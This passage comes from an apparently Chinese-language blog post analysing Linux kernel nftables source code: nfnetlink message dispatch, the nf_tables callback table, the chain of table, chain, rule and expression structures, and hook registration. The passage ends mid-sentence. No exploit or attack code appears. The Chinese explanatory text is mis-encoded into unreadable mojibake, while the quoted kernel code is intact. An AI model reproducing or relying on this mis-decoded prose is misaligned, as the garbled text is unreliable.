class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nfnl_callback</span> *<span class="hljs-title">nc</span>;</span><br>    <br>    <br>ss = nfnl_dereference_protected(subsys_id);<br>    <br><br>nc = nfnetlink_find_client(type, ss);<br>    <br>    <br>    err = nc-&gt;call(skb, &amp;info, (<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr **)cda);<br>    <br>    <br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nfnl_callback *<br><span class="hljs-title function_">nfnetlink_find_client</span><span class="hljs-params">(u16 type, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nfnetlink_subsystem *ss)</span><br>&#123;<br>u8 cb_id = NFNL_MSG_TYPE(type);<br><br><span class="hljs-keyword">if</span> (cb_id &gt;= ss-&gt;cb_count)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> &amp;ss-&gt;cb[cb_id];<br>&#125;<br></code></pre></td></tr></table></figure><p>nftablesçš„subsys_idæ˜¯10ï¼Œå¯¹åº”çš„nfnetlink_subsystem</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nfnetlink_subsystem</span> <span class="hljs-title">nf_tables_subsys</span> =</span> &#123;<br>.name= <span class="hljs-string">&quot;nf_tables&quot;</span>,<br>.subsys_id= NFNL_SUBSYS_NFTABLES,<br>.cb_count= NFT_MSG_MAX,<br>.cb= nf_tables_cb,<br>.commit= nf_tables_commit,<br>.<span class="hljs-built_in">abort</span>= nf_tables_abort,<br>.cleanup= nf_tables_cleanup,<br>.valid_genid= nf_tables_valid_genid,<br>.owner= THIS_MODULE,<br>&#125;;<br></code></pre></td></tr></table></figure><p>nfnl_callbackæ•°ç»„ï¼ŒåŒ…å«äº†è¡¨å’Œé“¾å„ç§æ•°æ®ç»“æ„çš„å¢åˆ æ”¹æŸ¥å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nfnl_callback</span> <span class="hljs-title">nf_tables_cb</span>[<span class="hljs-title">NFT_MSG_MAX</span>] =</span> &#123;<br>[NFT_MSG_NEWTABLE] = &#123;<br>.call= nf_tables_newtable,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_TABLE_MAX,<br>.policy= nft_table_policy,<br>&#125;,<br>[NFT_MSG_GETTABLE] = &#123;<br>.call= nf_tables_gettable,<br>.type= NFNL_CB_RCU,<br>.attr_count= NFTA_TABLE_MAX,<br>.policy= nft_table_policy,<br>&#125;,<br>[NFT_MSG_DELTABLE] = &#123;<br>.call= nf_tables_deltable,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_TABLE_MAX,<br>.policy= nft_table_policy,<br>&#125;,<br>[NFT_MSG_NEWCHAIN] = &#123;<br>.call= nf_tables_newchain,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_CHAIN_MAX,<br>.policy= nft_chain_policy,<br>&#125;,<br>[NFT_MSG_GETCHAIN] = &#123;<br>.call= nf_tables_getchain,<br>.type= NFNL_CB_RCU,<br>.attr_count= NFTA_CHAIN_MAX,<br>.policy= nft_chain_policy,<br>&#125;,<br>[NFT_MSG_DELCHAIN] = &#123;<br>.call= nf_tables_delchain,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_CHAIN_MAX,<br>.policy= nft_chain_policy,<br>&#125;,<br>[NFT_MSG_NEWRULE] = &#123;<br>.call= nf_tables_newrule,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_RULE_MAX,<br>.policy= nft_rule_policy,<br>&#125;,<br>[NFT_MSG_GETRULE] = &#123;<br>.call= nf_tables_getrule,<br>.type= NFNL_CB_RCU,<br>.attr_count= NFTA_RULE_MAX,<br>.policy= nft_rule_policy,<br>&#125;,<br>[NFT_MSG_DELRULE] = &#123;<br>.call= nf_tables_delrule,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_RULE_MAX,<br>.policy= nft_rule_policy,<br>&#125;,<br>[NFT_MSG_NEWSET] = &#123;<br>.call= nf_tables_newset,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_SET_MAX,<br>.policy= nft_set_policy,<br>&#125;,<br>[NFT_MSG_GETSET] = &#123;<br>.call= nf_tables_getset,<br>.type= NFNL_CB_RCU,<br>.attr_count= NFTA_SET_MAX,<br>.policy= nft_set_policy,<br>&#125;,<br>[NFT_MSG_DELSET] = &#123;<br>.call= nf_tables_delset,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_SET_MAX,<br>.policy= nft_set_policy,<br>&#125;,<br>[NFT_MSG_NEWSETELEM] = &#123;<br>.call= nf_tables_newsetelem,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_SET_ELEM_LIST_MAX,<br>.policy= nft_set_elem_list_policy,<br>&#125;,<br>[NFT_MSG_GETSETELEM] = &#123;<br>.call= nf_tables_getsetelem,<br>.type= NFNL_CB_RCU,<br>.attr_count= NFTA_SET_ELEM_LIST_MAX,<br>.policy= nft_set_elem_list_policy,<br>&#125;,<br>[NFT_MSG_DELSETELEM] = &#123;<br>.call= nf_tables_delsetelem,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_SET_ELEM_LIST_MAX,<br>.policy= nft_set_elem_list_policy,<br>&#125;,<br>[NFT_MSG_GETGEN] = &#123;<br>.call= nf_tables_getgen,<br>.type= NFNL_CB_RCU,<br>&#125;,<br>[NFT_MSG_NEWOBJ] = &#123;<br>.call= nf_tables_newobj,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_OBJ_MAX,<br>.policy= nft_obj_policy,<br>&#125;,<br>[NFT_MSG_GETOBJ] = &#123;<br>.call= nf_tables_getobj,<br>.type= NFNL_CB_RCU,<br>.attr_count= NFTA_OBJ_MAX,<br>.policy= nft_obj_policy,<br>&#125;,<br>[NFT_MSG_DELOBJ] = &#123;<br>.call= nf_tables_delobj,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_OBJ_MAX,<br>.policy= nft_obj_policy,<br>&#125;,<br>[NFT_MSG_GETOBJ_RESET] = &#123;<br>.call= nf_tables_getobj,<br>.type= NFNL_CB_RCU,<br>.attr_count= NFTA_OBJ_MAX,<br>.policy= nft_obj_policy,<br>&#125;,<br>[NFT_MSG_NEWFLOWTABLE] = &#123;<br>.call= nf_tables_newflowtable,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_FLOWTABLE_MAX,<br>.policy= nft_flowtable_policy,<br>&#125;,<br>[NFT_MSG_GETFLOWTABLE] = &#123;<br>.call= nf_tables_getflowtable,<br>.type= NFNL_CB_RCU,<br>.attr_count= NFTA_FLOWTABLE_MAX,<br>.policy= nft_flowtable_policy,<br>&#125;,<br>[NFT_MSG_DELFLOWTABLE] = &#123;<br>.call= nf_tables_delflowtable,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_FLOWTABLE_MAX,<br>.policy= nft_flowtable_policy,<br>&#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="nftablesæ•°æ®ç»“æ„"><a href="#nftablesæ•°æ®ç»“æ„" class="headerlink" title="nftablesæ•°æ®ç»“æ„"></a>nftablesæ•°æ®ç»“æ„</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">ç½‘ç»œå‘½åç©ºé—´â†’ è¿æ¥ â†’ è¡¨  â†’ é“¾   â†’ è§„åˆ™     â†’ è¡¨è¾¾å¼<br><br>netâ†’ nftables_pernetâ†’ nft_tableâ†’ nft_chainâ†’ nft_ruleâ†’ nft_expr<br></code></pre></td></tr></table></figure><p>æ•°æ®ç»“æ„ä¸å¤æ‚ï¼Œä¸Šä¸‹çº§ç»“æ„å’ŒåŒçº§ç»“æ„ä¹‹é—´éƒ½æ˜¯åŒé“¾è¡¨è¿æ¥</p><p>æ³¨æ„ä¸€ä¸‹nft_expræœ‰ <strong>nft_expr_ops</strong> è¡¨ç¤ºè¡¨è¾¾å¼çš„å¤„ç†å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr</span> &#123;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr_ops</span>*<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>data[]<br>__attribute__((aligned(__alignof__(u64))));<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr_ops</span> &#123;</span><br><span class="hljs-type">void</span>(*eval)(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_expr *expr,<br><span class="hljs-keyword">struct</span> nft_regs *regs,<br><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_pktinfo *pkt);<br><br>    <br><span class="hljs-type">int</span>(*init)(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_ctx *ctx,<br><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_expr *expr,<br><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr * <span class="hljs-type">const</span> tb[]);<br><br>    <br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr_type</span>*<span class="hljs-title">type</span>;</span><br><span class="hljs-type">void</span>*data;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>å®é™…è¿è¡Œè°ƒç”¨ <strong>eval</strong></li><li>åˆå§‹åŒ–è°ƒç”¨ <strong>init</strong></li></ul><h4 id="nftablesæ•°æ®ç»“æ„åˆ›å»ºå‡½æ•°"><a href="#nftablesæ•°æ®ç»“æ„åˆ›å»ºå‡½æ•°" class="headerlink" title="nftablesæ•°æ®ç»“æ„åˆ›å»ºå‡½æ•°"></a>nftablesæ•°æ®ç»“æ„åˆ›å»ºå‡½æ•°</h4><p>ç»ˆæç›®çš„æ˜¯æ³¨å†Œhookï¼Œæ‰€ä»¥ä¸»è¦å…³æ³¨æ€ä¹ˆæ’å…¥äº†ä»€ä¹ˆhook</p><h4 id="nf-tables-newtable"><a href="#nf-tables-newtable" class="headerlink" title="nf_tables_newtable"></a>nf_tables_newtable</h4><p>æ²¡ä»€ä¹ˆéœ€è¦æ³¨æ„çš„</p><ul><li>æŸ¥çœ‹tableæ˜¯å¦å·²ç»å­˜åœ¨ï¼Œå·²å­˜åœ¨åˆ™è°ƒç”¨ <strong>nf_tables_updtable</strong> æ›´æ–°table</li><li>ä¸å­˜åœ¨åˆ™æ–°å»ºtableï¼Œè¿›è¡Œå„ç§åˆå§‹åŒ–ï¼ŒåŠ å…¥netçš„tablesé“¾è¡¨</li></ul><h4 id="nf-tables-newchain"><a href="#nf-tables-newchain" class="headerlink" title="nf_tables_newchain"></a>nf_tables_newchain</h4><p>å¼€å§‹å’Œåˆ›å»ºtableæµç¨‹ä¸€è‡´</p><ul><li>æŸ¥æ‰¾tableæ˜¯å¦å­˜åœ¨</li><li>æŸ¥æ‰¾chainæ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨åˆ™è°ƒç”¨ <strong>nf_tables_updchain</strong> æ›´æ–°chain</li><li>ä¸å­˜åœ¨åˆ™è°ƒç”¨ <strong>nf_tables_addchain</strong> æ–°å»ºchain</li></ul><p><strong>nf_tables_addchain</strong> æµç¨‹</p><ul><li>å¦‚æœchainæ˜¯basechainï¼Œåˆ™åˆå§‹åŒ–basechain<ul><li>è°ƒç”¨ <strong>nft_chain_parse_hook</strong> åˆå§‹åŒ– <strong>nft_chain_hook</strong></li><li>è°ƒç”¨ <strong>nft_basechain_init</strong> åˆå§‹åŒ–basechain</li></ul></li><li>å¦åˆ™åªæ˜¯åˆ†é…ç©ºé—´</li><li>åˆ†é…handle</li><li>å¤åˆ¶name</li><li>åˆ†é…rulesç©ºé—´</li><li>è°ƒç”¨ <strong>nf_tables_register_hook</strong> æ³¨å†Œhook</li><li>å°†chainé“¾å…¥table</li></ul><p>è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠæ³¨å†Œhookçš„è¿‡ç¨‹æœ‰ä¸¤ä¸ª</p><ul><li>basechainçš„åˆå§‹åŒ–</li><li>è°ƒç”¨nf_tables_register_hookæ³¨å†Œhook</li></ul><p>çœ‹ä¸€ä¸‹å…·ä½“å‡½æ•°</p><ul><li><p>é¦–å…ˆæ˜¯ <strong>nft_chain_parse_hook</strong>ï¼Œç”¨äºåˆå§‹åŒ– <strong>nft_chain_hook</strong></p><p>nft_chain_hookç»“æ„ä½“è¦æ³¨å†Œçš„hookç”±å®ƒçš„ <strong>type</strong> å†³å®š</p><ul><li><p>typeå…ˆç”± <strong>__nft_chain_type_get</strong> è·å–defaultçš„type</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">type = __nft_chain_type_get(family, NFT_CHAIN_T_DEFAULT);<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain_type</span> *</span><br><span class="hljs-class">__<span class="hljs-title">nft_chain_type_get</span>(<span class="hljs-title">u8</span> <span class="hljs-title">family</span>, <span class="hljs-title">enum</span> <span class="hljs-title">nft_chain_types</span> <span class="hljs-title">type</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">if</span> (family &gt;= NFPROTO_NUMPROTO ||<br>    type &gt;= NFT_CHAIN_T_MAX)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> chain_type[family][type];<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>chain_type</strong> çš„åˆå§‹åŒ–åœ¨ <strong>nf_tables_module_init</strong> ä¸­è¿›è¡ŒğŸ‘†</p><p><em>æ‡’çš„ç”»äºŒç»´æ•°ç»„äº†QAQ</em></p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/chaintype.png" class title="chaintype"><p>nf_tables_module_initåˆå§‹åŒ–çš„typeéƒ½æ˜¯NFT_CHAIN_T_DEFAULTç±»å‹ï¼Œä¸¾ä¸ª:chestnut:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain_type</span> <span class="hljs-title">nft_chain_filter_netdev</span> =</span> &#123;<br>.name= <span class="hljs-string">&quot;filter&quot;</span>,<br>.type= NFT_CHAIN_T_DEFAULT,<br>.family= NFPROTO_NETDEV,<br>.hook_mask= (<span class="hljs-number">1</span> &lt;&lt; NF_NETDEV_INGRESS) |<br>  (<span class="hljs-number">1</span> &lt;&lt; NF_NETDEV_EGRESS),<br>.hooks= &#123;<br>[NF_NETDEV_INGRESS]= nft_do_chain_netdev,<br>[NF_NETDEV_EGRESS]= nft_do_chain_netdev,<br>&#125;,<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>å¦‚æœç”¨æˆ·å®šä¹‰äº†å…·ä½“çš„typeï¼Œåˆ™ç”± <strong>nf_tables_chain_type_lookup</strong> è·å–type</p><p>å…·ä½“æ‰§è¡Œè¿‡ç¨‹æ˜¯éå†chain_typeæ•°ç»„å¯¹æ¯”nameæ˜¯å¦ä¸€è‡´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain_type</span> *</span><br><span class="hljs-class">__<span class="hljs-title">nf_tables_chain_type_lookup</span>(<span class="hljs-title">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title">nlattr</span> *<span class="hljs-title">nla</span>, <span class="hljs-title">u8</span> <span class="hljs-title">family</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain_type</span> *<span class="hljs-title">type</span>;</span><br><span class="hljs-type">int</span> i;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NFT_CHAIN_T_MAX; i++) &#123;<br>type = __nft_chain_type_get(family, i);<br><span class="hljs-keyword">if</span> (!type)<br><span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">if</span> (!nla_strcmp(nla, type-&gt;name))<br><span class="hljs-keyword">return</span> type;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>nft_basechain_init</strong> ä¸­è¿›è¡Œäº†basechainçš„typeå’Œopsçš„åˆå§‹åŒ–ï¼ˆçº¢çº¿æ•°æ®èµ‹å€¼æ–¹å‘ï¼Œé»‘çº¿æŒ‡é’ˆæŒ‡å‘ï¼‰</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/ops.png" class title="ops"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">nft_basechain_hook_init</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> nf_hook_ops *ops, u8 family,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_chain_hook *hook,</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> nft_chain *chain)</span><br>&#123;<br>ops-&gt;pf= family;<br>ops-&gt;hooknum= hook-&gt;num;<br>ops-&gt;priority= hook-&gt;priority;<br>ops-&gt;priv= chain;<br>ops-&gt;hook= hook-&gt;type-&gt;hooks[ops-&gt;hooknum];<br>ops-&gt;hook_ops_type= NF_HOOK_OP_NF_TABLES;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_basechain_init</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> nft_base_chain *basechain, u8 family,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> nft_chain_hook *hook, u32 flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain</span> *<span class="hljs-title">chain</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_hook</span> *<span class="hljs-title">h</span>;</span><br><br>basechain-&gt;type = hook-&gt;type;<br>INIT_LIST_HEAD(&amp;basechain-&gt;hook_list);<br>chain = &amp;basechain-&gt;chain;<br><br><span class="hljs-keyword">if</span> (nft_base_chain_netdev(family, hook-&gt;num)) &#123;<br>list_splice_init(&amp;hook-&gt;<span class="hljs-built_in">list</span>, &amp;basechain-&gt;hook_list);<br>list_for_each_entry(h, &amp;basechain-&gt;hook_list, <span class="hljs-built_in">list</span>)<br>nft_basechain_hook_init(&amp;h-&gt;ops, family, hook, chain);<br><br>basechain-&gt;ops.hooknum= hook-&gt;num;<br>basechain-&gt;ops.priority= hook-&gt;priority;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>nft_basechain_hook_init(&amp;basechain-&gt;ops, family, hook, chain);<br>&#125;<br><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>nf_tables_register_hook</strong> å¯ä»¥çœ‹å‡ºæ³¨å†Œçš„æ˜¯basechainçš„opsæˆ–è€…hook_listä¸­çš„nft_hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nf_tables_register_hook</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_table *table,</span><br><span class="hljs-params">   <span class="hljs-keyword">struct</span> nft_chain *chain)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_base_chain</span> *<span class="hljs-title">basechain</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_ops</span> *<span class="hljs-title">ops</span>;</span><br><br><span class="hljs-keyword">if</span> (table-&gt;flags &amp; NFT_TABLE_F_DORMANT ||<br>    !nft_is_base_chain(chain))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>basechain = nft_base_chain(chain);<br>ops = &amp;basechain-&gt;ops;<br><br><span class="hljs-keyword">if</span> (basechain-&gt;type-&gt;ops_register)<br><span class="hljs-keyword">return</span> basechain-&gt;type-&gt;ops_register(net, ops);<br><br><span class="hljs-keyword">if</span> (nft_base_chain_netdev(table-&gt;family, basechain-&gt;ops.hooknum))<br><span class="hljs-keyword">return</span> nft_netdev_register_hooks(net, &amp;basechain-&gt;hook_list);<br><br><span class="hljs-keyword">return</span> nf_register_net_hook(net, &amp;basechain-&gt;ops);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_netdev_register_hooks</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net,</span><br><span class="hljs-params">     <span class="hljs-keyword">struct</span> list_head *hook_list)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_hook</span> *<span class="hljs-title">hook</span>;</span><br><span class="hljs-type">int</span> err, j;<br><br>j = <span class="hljs-number">0</span>;<br>list_for_each_entry(hook, hook_list, <span class="hljs-built_in">list</span>) &#123;<br>err = nf_register_net_hook(net, &amp;hook-&gt;ops);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err_register;<br><br>j++;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err_register:<br>list_for_each_entry(hook, hook_list, <span class="hljs-built_in">list</span>) &#123;<br><span class="hljs-keyword">if</span> (j-- &lt;= <span class="hljs-number">0</span>)<br><span class="hljs-keyword">break</span>;<br><br>nf_unregister_net_hook(net, &amp;hook-&gt;ops);<br>&#125;<br><span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="nf-tables-newrule"><a href="#nf-tables-newrule" class="headerlink" title="nf_tables_newrule"></a>nf_tables_newrule</h4><ul><li>æŸ¥æ‰¾table</li><li>æŸ¥æ‰¾chain</li><li>å¦‚æœæœ‰NFTA_RULE_EXPRESSIONSï¼Œéå†æ‰€æœ‰expressionsï¼Œè°ƒç”¨ <strong>nf_tables_expr_parse</strong> åˆå§‹åŒ– <strong>expr_info</strong></li><li>è°ƒç”¨ 